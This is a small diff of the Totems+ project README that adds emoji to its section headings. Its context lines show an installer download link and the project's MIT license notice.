@@ -7,12 +7,12 @@
   [Totems+ v1.2.0](https://www.mediafire.com/file/6s8gqlti3z5i627/Totems++Installer.exe/file)
   
 # 
-# Introduction
-# Usage
-# Setup
-# Documentation
-# Structure
-# Feedback
+# 🟠 Introduction
+# 🏃 Usage
+# 🪛 Setup
+# 📄 Documentation
+# 🏛️ Structure
+# 📣 Feedback
 # 📜 License
 
 Totems+ is currently licensed under an [MIT License](https://opensource.org/licenses/MIT).
